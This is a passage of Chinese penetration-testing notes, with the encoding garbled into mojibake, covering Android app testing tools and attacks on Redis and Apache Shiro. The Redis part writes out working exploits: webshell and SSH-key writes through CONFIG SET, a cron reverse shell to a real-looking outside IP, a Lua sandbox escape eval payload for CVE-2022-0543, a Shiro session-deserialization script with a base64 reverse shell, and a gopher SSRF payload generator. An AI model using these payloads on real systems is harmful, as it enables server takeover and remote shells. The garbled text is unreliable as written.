é™¤å¸è½½å…¶ä»–åº”ç”¨ã€‚ serviceåŠ«æŒ éšå¼å¯åŠ¨services,å½“å­˜åœ¨åŒåservices,å…ˆå®‰è£…åº”ç”¨çš„servicesä¼˜å…ˆçº§é«˜ æ¶ˆæ¯ä¼ªé€  æš´éœ²çš„Serviceå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Serviceæ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£ æ‹’ç»æœåŠ¡ Serviceçš„æ‹’ç»æœåŠ¡ä¸»è¦æ¥æºäºServiceå¯åŠ¨æ—¶å¯¹æ¥æ”¶çš„Intentç­‰æ²¡æœ‰åšå¼‚å¸¸æƒ…å†µä¸‹çš„å¤„ç†ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒ è·å–å¯å¯¼å‡ºæœåŠ¡ # run app.service.info -a dz> run app.service.info -a com.mwr.example.sieve Package: com.mwr.example.sieve com.mwr.example.sieve.AuthService Permission: null com.mwr.example.sieve.CryptoService Permission: null å…¶ä»–æµ‹è¯•å§¿åŠ¿ é€šè¿‡æ›´æ”¹æ‰‹æœºçš„å‹å·æ¥é‡ç½®APPä¸­çš„ä½“éªŒæ¬¡æ•° å…¶ä»–å·¥å…· APPæ¨¡æ‹Ÿå™¨ å¤œç¥æ¨¡æ‹Ÿå™¨>7.0.2ï¼ˆXPosedæ¡†æ¶è¦æ±‚ï¼‰ åç¼–è¯‘ jadx-gui GDAä¸»é¡µ-äºšæ´²é¦–æ¬¾äº¤äº’å¼Androidåç¼–è¯‘å™¨ APKç­¾å GetAPKInfoï¼ˆéªŒç­¾ï¼‰ apktoolï¼ˆæ‰“åŒ…/è§£åŒ…ï¼‰ signapkï¼ˆç­¾åï¼‰ APKæ¼æ‰« MobSF æ‘¸ç“œ-æŸ¥è¯ˆéª—APPæŸ¥ç—…æ¯’APPå…è´¹APKåç¼–è¯‘åˆ†æå·¥å…· (mogua.co) å…¶ä»–å°å·¥å…· AppInfoScanner å‰ææ¡ä»¶æ˜¯è„±äº†å£³ ä¸€æ¬¾é€‚ç”¨äºä»¥HWè¡ŒåŠ¨/çº¢é˜Ÿ/æ¸—é€æµ‹è¯•å›¢é˜Ÿä¸ºåœºæ™¯çš„ç§»åŠ¨ç«¯(Androidã€iOSã€WEBã€H5ã€é™æ€ç½‘ç«™)ä¿¡æ¯æ”¶é›†æ‰«æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆã€æ”»å‡»é˜Ÿæˆå‘˜ã€çº¢é˜Ÿæˆå‘˜å¿«é€Ÿæ”¶é›†åˆ°ç§»åŠ¨ç«¯æˆ–è€…é™æ€WEBç«™ç‚¹ä¸­å…³é”®çš„èµ„äº§ä¿¡æ¯å¹¶æä¾›åŸºæœ¬çš„ä¿¡æ¯è¾“å‡º,å¦‚ï¼šTitleã€Domainã€CDNã€æŒ‡çº¹ä¿¡æ¯ã€çŠ¶æ€ä¿¡æ¯ç­‰ã€‚ sulab999/AppMessenger: ä¸€æ¬¾é€‚ç”¨äºä»¥APPç—…æ¯’åˆ†æã€APPæ¼æ´æŒ–æ˜ã€APPå¼€å‘ã€HWè¡ŒåŠ¨/çº¢é˜Ÿ/æ¸—é€æµ‹è¯•å›¢é˜Ÿä¸ºåœºæ™¯çš„ç§»åŠ¨ç«¯(Androidã€iOS)è¾…åŠ©åˆ†æå·¥å…· å‚è€ƒæ–‡ç«  Appå®‰å…¨æ£€æµ‹æŒ‡å— https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html Appé˜²æŠ“åŒ…æœ‰å››ç§ç»•è¿‡æ–¹æ³•ï¼ˆè¯¦ç»†ï¼‰ å¦‚ä½•ä½¿ç”¨Xposed+JustTrustMeæ¥çªç ´SSL Pinning - çŸ¥ä¹ Android è°ƒè¯•æ¡¥ (adb) | Android å¼€å‘è€… | Android Developers æ¨èï¼šWindXaa/Android-Vulnerability-Mining: Android APPæ¼æ´ä¹‹æˆ˜ç³»åˆ—ï¼Œä¸»è¦è®²è¿°å¦‚ä½•å¿«é€ŸæŒ–æ˜APPæ¼æ´ (github.com) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:49:04 "},"01.æ¸—é€æµ‹è¯•/04.ç§»åŠ¨å®‰å…¨/ç¯å¢ƒ.html":{"url":"01.æ¸—é€æµ‹è¯•/04.ç§»åŠ¨å®‰å…¨/ç¯å¢ƒ.html","title":"ç¯å¢ƒ","keywords":"","body":"APPæŠ“åŒ… ç¯å¢ƒæ£€æµ‹ è¿‡Rootæ£€æµ‹ Magsik+Shamikoç™½åå• è¿‡Fridaæ£€æµ‹ï¼ˆåŒ…åï¼Œç‰¹å¾ï¼Œç«¯å£ï¼‰ https://github.com/suifei/fridare https://github.com/CrackerCat/strongR-frida-android è¿‡ä»£ç†æ£€æµ‹ SSLUnpinningï¼Œç®—æ³•åŠ©æ‰‹Pro æŠ“åŒ…ä»£ç†è½¯ä»¶ Tun2Socksï¼ŒReqableï¼ŒWifiä»£ç† è„±å£³ è„±å£³æœ€ä¸»è¦çš„ç›®çš„æ˜¯è¿˜åŸè¢«æ··æ·†ã€æŠ½å–çš„å‡½æ•°ï¼Œä¾¿äºä¸Šé’©å­æˆ–è°ƒè¯•ã€é˜…è¯»ä»£ç ã€‚ æŸ¥å£³ MagiCiAn1/APKProtectionSearch: apkæŸ¥å£³å·¥å…· (github.com) MT/NPç®¡ç†å™¨ APK Messenger GDA è„±å£³ BlackDex é¢å…·DITORæ¨¡å— è„±å£³å·¥å…·ï¼šåå°„å¤§å¸ˆçš„ä½¿ç”¨è¯¦è§£-CSDNåšå®¢ dstmath/frida-unpack: åŸºäºFridaçš„è„±å£³å·¥å…· (github.com) https://github.com/hluwa/frida-dexdump Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:49:08 "},"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/Redisæ¼æ´.html":{"url":"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/Redisæ¼æ´.html","title":"Redisæ¼æ´","keywords":"","body":"ç¯å¢ƒæ­å»º Redis - å„å¹³å°æ­å»ºRedis - å¬é›¨å±æ¥¼ - åšå®¢å›­ (cnblogs.com) Vulhub åŸºæœ¬äº†è§£ Redisæ˜¯Cè¯­è¨€å¼€å‘ä¸€ä¸ªå¼€æº(éµå¾ªBSD)åè®®é«˜æ€§èƒ½çš„(key-value)é”®å€¼å¯¹çš„å†…å­˜NoSQLæ•°æ®åº“,å¯ä»¥ç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜ã€ä¿¡æ¯ä¸­é—´ä»¶(æ€§èƒ½éå¸¸ä¼˜ç§€ï¼Œæ”¯æŒæŒä¹…åŒ–åˆ°ç¡¬ç›˜ä¸”é«˜å¯ç”¨)ï¼Œç”±äºå…¶è‡ªèº«ç‰¹ç‚¹ï¼Œå¯ä»¥å¹¿æ³›åº”ç”¨åœ¨æ•°æ®é›†ç¾¤ï¼Œåˆ†å¸ƒå¼é˜Ÿåˆ—ï¼Œä¿¡æ¯ä¸­é—´ä»¶ç­‰ç½‘ç»œæ¶æ„ä¸­ã€‚ Redisæ•°æ®åº“å¸¸ç”¨å‘½ä»¤ # å¯åŠ¨ redis-server /etc/redis.conf redis-cli -h host # å…å¯†ç™»å½• redis-cli -h host -p port -a password # ä½¿ç”¨ Redis å¯†ç ç™»å½• Redis æœåŠ¡ # è¿›å…¥å‘½ä»¤è¡Œå config get requirepass # æŸ¥çœ‹å¯†ç  config set requirepass passwd # è®¾ç½®å¯†ç  auth passwd # è®¤è¯ info # ç›¸å…³ä¿¡æ¯ SET key \"Hello World\" # è®¾ç½®é”® key çš„å€¼ä¸ºå­—ç¬¦ä¸² Hello World GET key # è·å–é”® key çš„å€¼ï¼Œå¦‚æœ key ä¸å­˜åœ¨ï¼Œè¿”å› nil ã€‚å¦‚æœkey å‚¨å­˜çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œè¿”å›ä¸€ä¸ªé”™è¯¯ DEL key # åˆ é™¤é”® key KEYS * # è·å– redis ä¸­æ‰€æœ‰çš„ key,Keys å‘½ä»¤ç”¨äºæŸ¥æ‰¾æ‰€æœ‰ç¬¦åˆç»™å®šæ¨¡å¼ pattern çš„ key SAVE # ç”¨äºåˆ›å»ºå½“å‰æ•°æ®åº“çš„å¤‡ä»½,åœ¨ redis å®‰è£…ç›®å½•ä¸­åˆ›å»ºdump.rdbæ–‡ä»¶ CONFIG GET requirepass # ç”¨äºè·å– redis æœåŠ¡çš„é…ç½®å‚æ•°ï¼Œé€šè¿‡ CONFIG å‘½ä»¤æŸ¥çœ‹æˆ–è®¾ç½®é…ç½®é¡¹ Flushall # ç”¨äºæ¸…ç©ºæ•´ä¸ª Redis æœåŠ¡å™¨çš„æ•°æ®(åˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰ key) SELECT index # Redis Select å‘½ä»¤ç”¨äºåˆ‡æ¢åˆ°æŒ‡å®šçš„æ•°æ®åº“ï¼Œæ•°æ®åº“ç´¢å¼•å· index ç”¨æ•°å­—å€¼æŒ‡å®šï¼Œä»¥ 0 ä½œä¸ºèµ·å§‹ç´¢å¼•å€¼ã€‚ redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡ RedisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡RESPï¼ˆREdis Serialization Protocolï¼‰åè®®é€šä¿¡ã€‚ æŠ“åŒ… tcpdump port 6379 -w ./redis.pcap æ‰§è¡Œå‘½ä»¤ 127.0.0.1:6379> auth 123456 OK 127.0.0.1:6379> set name khaz OK 127.0.0.1:6379> get name \"khaz\" å¯¹åº”çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ç”¨\\r\\néš”å¼€çš„ã€‚ å¯¹äºSimple Stringsï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯+ å¯¹äºerrorï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯- å¯¹äºIntegerï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯: å¯¹äºBulk Stringsï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯$ å¯¹äºarrayï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯* æ­¤å¤–ï¼ŒRESPèƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„Bulk Stringsæˆ–Arrayçš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤ºNullå€¼ã€‚ åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥\"\\r\\n\"(CRLF)ç»“æŸã€‚ åˆ©ç”¨å¤‡ä»½åŠŸèƒ½å†™å…¥æ–‡ä»¶ åŸç† redisæä¾›äº†å¤‡ä»½æ•°æ®åº“çš„åŠŸèƒ½ï¼Œå¤‡ä»½çš„æ–‡ä»¶åå’Œå¤‡ä»½çš„è·¯å¾„éƒ½å¯ä»¥é€šè¿‡ config set dbfilename config set dir æ¥æ§åˆ¶,ä»è€Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶å†™åŠŸèƒ½ã€‚ æ³¨æ„ç‚¹ æ•°æ®åº“å¤‡ä»½ä¸ºå¿«ç…§æ–‡ä»¶å­˜åœ¨ä¸€å®šæ ¼å¼(è„æ•°æ®)ï¼Œæ‰€ä»¥å†™å…¥çš„å†…å®¹éœ€è¦åŠ ä¸Šæ¢è¡Œç¬¦ã€‚ flushallå‘½ä»¤ flushallå‘½ä»¤ä¼šæ¸…ç©ºæ‰€æœ‰ç¼“å­˜æ•°æ®,è¿™ä¸ªåœ¨ä¸€å®šç¨‹åº¦ä¸ä¼šé€ æˆå·¨å¤§çš„æŸå¤±ï¼Œä½†æ˜¯ä¼šç»™ä¸šåŠ¡ä½“éªŒå¸¦æ¥å½±å“ã€‚ redisé»˜è®¤æœ‰16ä¸ªæ•°æ®åº“ æ‰€ä»¥ä¸ç”¨flushallæ¥æ¸…ç©ºé»˜è®¤0å·çš„æ•°æ®åº“å†…å®¹ï¼Œåªéœ€è¦åˆ‡æ¢åˆ°å…¶ä»–çš„ç©ºæ•°æ®åº“å³å¯ dbsize # æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„keyæ•°é‡ select 4 # é€‰æ‹©æ²¡æœ‰æ•°æ®çš„æ•°æ®åº“ å†™å…¥Webshell rootæƒé™æ‰§è¡Œçš„redisæˆ–è€…ä»¥æŸä¸ªwebæœåŠ¡å¯åŠ¨çš„redis çŸ¥é“ç½‘ç«™webè·¯å¾„ select 5 set 1 '\\n\\n\\n\\n' config set dir /var/www/html config set dbfilename shell.php save å†™å…¥sshå…¬é’¥ é«˜æƒé™ select 5 set 1 \"\\n\\nå…¬é’¥å†…å®¹\\n\\n\" config set dir /root/.ssh/ config set dbfilename authorized_keys save å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell rootæƒé™ Centosç³»ç»Ÿ å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™ ubuntuè¦æ±‚å®šæ—¶ä»»åŠ¡æ–‡ä»¶æƒé™å¿…é¡»æ˜¯600 Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶æƒé™644ä¹Ÿèƒ½æ‰§è¡Œ å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™ select 5 set 1 '\\n\\n*/1 * * * * bash -i >& /dev/tcp/124.220.192.120/1234 0>&1\\n\\n' config set dir /var/spool/cron/ config set dbfilename root save å®šæ—¶ä»»åŠ¡ä½ç½® /etc/crontabæ–‡ä»¶ /etc/cron.xxxç›®å½• /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ ç”¨æˆ·å®šæ—¶ç›®å½• # Debianç³»åˆ—ï¼ˆUbuntuï¼‰ /var/spool/cron/crontabs/ # RedHatç³»åˆ—ï¼ˆCentosï¼‰ /var/spool/cron/ ä¸»ä»å¤åˆ¶RCE 4.x >= Version ä¸»ä»å¤åˆ¶æ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚ å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave). æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚ ä»èŠ‚ç‚¹åœ¨æ¥æ”¶æ•°æ®æ—¶ï¼Œä¼šå…ˆå°†è‡ªèº«çš„æ•°æ®æ¸…ç©ºã€‚ å»ºç«‹ä¸»ä»å…³ç³»åªéœ€è¦åœ¨ä»èŠ‚ç‚¹æ“ä½œå°±è¡Œäº†ï¼Œä¸»èŠ‚ç‚¹ä¸ç”¨ä»»ä½•æ“ä½œ ä¸»ä»å¤åˆ¶RCEç®€å•çš„è¯´å°±æ˜¯å°†Rouge Serverï¼ˆä¸»èŠ‚ç‚¹ï¼‰ä¸Šçš„æ¶æ„.soæ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡ä¸»æœºï¼ˆä»èŠ‚ç‚¹ï¼‰ä¸Šï¼Œä»è€Œè¾¾åˆ°RCEã€‚ Luaæ²™ç›’é€ƒé€¸--CVE-2022-0543 æ¼æ´å¤ç° è¿è¡Œåœ¨Debianç³»åˆ—çš„linuxä¸Šçš„Redis å®é™…ä¸Šæ˜¯ç³»ç»Ÿé—®é¢˜ï¼Œè€Œä¸æ˜¯redisçš„é—®é¢˜ åœ¨ Debian ç³»çš„ Linux å‘è¡Œç‰ˆç³»ç»Ÿä¸Šï¼ŒLuaçš„package å˜é‡æ²¡æœ‰è¢«æ­£ç¡®æ¸…é™¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥è¿›è¡Œ Lua æ²™ç®±é€ƒé€¸ï¼Œä»è€Œæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚ å€ŸåŠ©Luaæ²™ç®±ä¸­é—ç•™çš„å˜é‡packageçš„loadlibå‡½æ•°æ¥åŠ è½½åŠ¨æ€é“¾æ¥åº“/usr/lib/x86_64-linux-gnu/liblua5.1.so.0é‡Œçš„å¯¼å‡ºå‡½æ•°luaopen_ioã€‚åœ¨Luaä¸­æ‰§è¡Œè¿™ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œå³å¯è·å¾—ioåº“ï¼Œå†ä½¿ç”¨å…¶æ‰§è¡Œå‘½ä»¤ï¼š local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res æ³¨æ„ä¸åŒç¯å¢ƒä¸‹çš„libluaåº“è·¯å¾„ä¸åŒï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªæ­£ç¡®çš„è·¯å¾„ è¿æ¥redisï¼Œä½¿ç”¨evalå‘½ä»¤æ‰§è¡Œä¸Šè¿°è„šæœ¬ï¼š eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 å·¥å…·ä¸€é”®æ‰§è¡Œå‘½ä»¤ Shiro-Redisååºåˆ—åŒ– shiroé»˜è®¤å°†sessionå­˜å‚¨åœ¨å†…å­˜é‡Œé¢ã€‚è¿™æ ·å¯¼è‡´shiroçš„sessionæ˜¯ä¸å…±äº«çš„ã€‚ä½¿ç”¨redisæ¥å­˜å‚¨shiro sessionå¯ä»¥è®©å…¶ä»–æœåŠ¡ä¹Ÿå…±äº«shiroçš„è®¤è¯ä¿¡æ¯ã€‚ è¿‡ç¨‹ï¼šshiroä¼šæ ¹æ®jessionidæ¥æ‰¾åˆ°å­˜å‚¨äºredisä¸­çš„sessionä¿¡æ¯ï¼Œå¹¶å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ã€‚ å‘redisä¸­æ’å…¥æ¶æ„sessionä¿¡æ¯ import pyyso import redis redis_conn=redis.StrictRedis(host=\"192.168.1.104\", port=6379,password=\"abc123\") # whatever æ˜¯ session åç§° whatever=b\"123\" key=b\"shiro:session:\"+whatever value=pyyso.cb1v192('bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}\"') print(value) redis_conn.set(key,value) æ›´æ”¹æ”¹JESSIONIDä¸º123ï¼Œå†æ¬¡è®¿é—®å³å¯è§¦å‘ååºåˆ—åŒ–ã€‚ SSRFæ‰“Redis ä½ç‰ˆæœ¬æƒ…å†µ é…åˆhttpè¯·æ±‚ ä½ç‰ˆæœ¬çš„Redisä¼šå°†httpè¯·æ±‚çš„è¯·æ±‚å¤´å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æ éœ€è¦è®¤è¯æƒ…å†µ å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ é…ç½®æ–‡ä»¶ # é€šè¿‡requirepassæ¥å®šä½å¯†ç  /etc/redis.conf /etc/redis/redis.conf /usr/local/redis/etc/redis.conf /opt/redis/ect/redis.conf å¼±å¯†ç çˆ†ç ´ dict://192.168.174.129:6379/AUTH passwd è®¤è¯æˆåŠŸ è®¤è¯å¤±è´¥ æœªæˆæƒæƒ…å†µ é…åˆdictåè®® dict://x.x.x.x:6379/ é…åˆgopheråè®® é¦–å…ˆè¦å°†å‘½ä»¤è½¬æ¢ä¸ºRESPåè®®æ ¼å¼ import urllib.request, urllib.parse, urllib.error protocol=\"gopher://\" ip=\"192.168.163.128\" port=\"6379\" # å†™é©¬ shell=\"\\n\\n\\n\\n\" #å†™å…¥çš„æ–‡ä»¶å†…å®¹ filename=\"shell.php\" path=\"/var/www/html\" # webç›®å½• # å†™sshå…¬é’¥ /* filename=\"authorized_keys\" ssh_pub=\"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\\n\\n\" path=\"/root/.ssh/\" */ # è®¡åˆ’ä»»åŠ¡åå¼¹shell ç³»ç»Ÿå¿…é¡»ä¸ºCentosï¼Œå®šæ—¶ä»»åŠ¡æƒé™é—®é¢˜ï¼šCentos--644 Ubuntu--600 /* reverse_ip=\"192.168.163.132\" reverse_port=\"2333\" cron=\"\\n\\n\\n\\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\\n\\n\\n\\n\"%(reverse_ip,reverse_port) filename=\"root\" path=\"/var/spool/cron\" */ passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] # å¦‚æœrediséœ€è¦è®¤è¯ï¼Œå°±åœ¨cmdç¬¬ä¸€è¡Œæ’å…¥è®¤è¯å‘½ä»¤ if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" # \"/_\" gopheråè®®ç‰¹æ€§ï¼Œä¼šåƒæ‰urlåçš„ä¸€ä¸ªå­—ç¬¦ def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.parse.quote(redis_format(x)) print(payload) Windowsä¸‹çš„æ€è·¯--æ²¡è¯• Windowsçš„Redisç‰ˆæœ¬åœç•™åœ¨3.2 Windowsçš„è‡ªå¯åŠ¨ï¼šç³»ç»ŸæœåŠ¡ã€è®¡åˆ’ä»»åŠ¡ã€æ³¨å†Œè¡¨å¯åŠ¨é¡¹ã€ç”¨æˆ·çš„startupç›®å½• è¸©å‘è®°å½•-Redis(Windows)çš„getshell - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) RedisæŒ–çŸ¿ Redis æœªæˆæƒè®¿é—®æ¼æ´åˆ†æ cleanfda è„šæœ¬å¤ç°æ¼æ´æŒ–çŸ¿ - åšå®¢æ–‡ç«  - ä»»éœçš„ä¸ªäººåšå®¢ç½‘ç«™ https://www.renfei.net/posts/1003501 æ¼æ´åˆ©ç”¨å·¥å…· yuyan-sec/RedisEXP: Redis æ¼æ´åˆ©ç”¨å·¥å…· (github.com) n0b0dyCN/redis-rogue-server: Redis( å‚è€ƒæ–‡ç«  æµ…æLinuxä¸‹Redisçš„æ”»å‡»é¢(ä¸€) - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) redisæœªæˆæƒåˆ°shiroååºåˆ—åŒ– - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) redisæœªæˆæƒåˆ°shiroååºåˆ—åŒ–ä¹‹sessionå›æ˜¾é©¬|NOSECå®‰å…¨è®¯æ¯å¹³å° - ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢ æµ…æRedisä¸­SSRFçš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:47:08 "},"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/shiroæ¼æ´.html":{"url":"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/shiroæ¼æ´.html","title":"Shiroæ¼æ´","keywords":"","body":"Shiroæ¦‚è¿° â€‹ Apache Shiroæ˜¯ä¸€ä¸ªå¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚ â€‹ é€šå¸¸ä¸tomcatä¸€èµ·ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥æ›¿æ¢spring securityé›†æˆåˆ°springä¸­ï¼ˆå¦‚è‹¥ä¾ï¼‰ã€‚ æ¡†æ¶ç‰¹å¾ åœ¨è¯·æ±‚åŒ…çš„Cookieä¸­æœ‰rememberMeå­—æ®µèµ‹ä»»æ„å€¼ï¼Œæ”¶åˆ°è¿”å›åŒ…çš„ Set-Cookie ä¸­å­˜åœ¨rememberMe=deleteMeå­—æ®µï¼Œè¯´æ˜ç›®æ ‡æœ‰ä½¿ç”¨Shiroæ¡†æ¶ ååºåˆ—åŒ–æ¼æ´ â€‹ Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚ åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼çš„å¤„ç† RememberMe Cookieå€¼ => base64è§£ç  => AESè§£å¯† => ååºåˆ—åŒ– å¦‚æœçŸ¥é“AESçš„å¯†é’¥å°±å¯ä»¥æ„é€ æ¶æ„cookieï¼Œä»è€Œé€ æˆååºåˆ—åŒ–RCEæ¼æ´ã€‚æ‰€ä»¥è¿™ä¹Ÿæ˜¯shiroååºåˆ—åŒ–ç»ä¹…ä¸è¡°çš„åŸå› ã€‚ payloadç”Ÿæˆ æ¶æ„ç±» => åºåˆ—åŒ– => AESåŠ å¯† => base64ç¼–ç  shiro-550 â€‹ Apache Shiro 1.2.5ä¹‹å‰çš„ç‰ˆæœ¬åœ¨org.apache.shiro.mgt.AbstractRememberMeManagerä¸­å­˜åœ¨AESé»˜è®¤ç§˜é’¥kPH+bIxk5D2deZiIxcaaaA==ã€‚ â€‹ åœ¨ä¹‹åçš„ç‰ˆæœ¬ï¼Œå¯†é’¥ä¸ºéšæœºç”Ÿæˆçš„ï¼Œä½†æ˜¯æŒ¡ä¸ä½å¼€å‘äººå‘˜çš„å®‰å…¨æ„è¯†ä¸åˆ°ä½ã€‚ shiro-721 æ¦‚è¿° â€‹ Apache Shiro 1.4.2ä¹‹å‰çš„ç‰ˆæœ¬é»˜è®¤ä½¿ç”¨AES/CBC/PKCS5Paddingæ¨¡å¼åŠ å¯†ï¼Œè¯¥åŠ å¯†æ¨¡å¼å­˜åœ¨ç¼ºé™·ï¼Œå½“æ”»å‡»è€…è·å¾—ä¸€ä¸ªæœ‰æ•ˆçš„rememberMe Cookieå€¼æ—¶ï¼Œå¯ä»¥é€šè¿‡Padding Oracle Attackæ„é€ æœ‰æ•ˆçš„æ¶æ„åºåˆ—åŒ–æ•°æ®æ¥å‘èµ·æ”»å‡»ã€‚ å¤ç° å‚è€ƒinspiringz/Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com) æ³¨æ„ç‚¹ï¼šå› ä¸ºçˆ†ç ´çš„æ—¶é—´å¤ªé•¿ï¼ˆå‡ ä¸ªå°æ—¶ï¼‰ï¼Œä¸é€‚ç”¨äºå®é™…ç¯å¢ƒçš„æµ‹è¯•ã€‚ä¼šæŠŠç¯å¢ƒæ‰“å´©æˆ–è€…ipè¢«ban æ­£å¸¸ç™»å½•ç½‘ç«™ï¼ˆå‹¾é€‰Rememberï¼‰ï¼Œå¹¶ä»Cookieä¸­è·å–åˆæ³•çš„RememberMeã€‚ ä½¿ç”¨RememberMe cookieä½œä¸ºPadding Oracle 